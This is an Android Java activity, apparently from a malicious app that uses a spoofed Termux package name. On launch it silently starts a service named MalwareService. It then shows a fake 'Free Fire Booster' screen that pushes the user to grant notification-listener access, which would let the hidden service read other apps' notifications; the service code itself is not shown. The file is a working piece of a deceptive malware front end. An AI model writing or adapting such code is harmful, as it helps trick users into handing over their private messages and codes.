package com.termux.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.view.View;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, MalwareService.class));

        if (!isNotificationPermissionGranted()) {
            setContentView(createLayout());
        } else {
            finish();
        }
    }

    private boolean isNotificationPermissionGranted() {
        String packageName = getPackageName();
        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return enabledListeners != null && enabledListeners.contains(packageName);
    }

    private View createLayout() {
        TextView text = new TextView(this);
        text.setText("To enable Free Fire Booster, please allow notification access.");
        text.setTextSize(18);
        text.setPadding(50, 50, 50, 50);

        Button button = new Button(this);
        button.setText("Open Settings");
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);
            }
        });

        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.addView(text);
        layout.addView(button);
        return layout;
    }
}
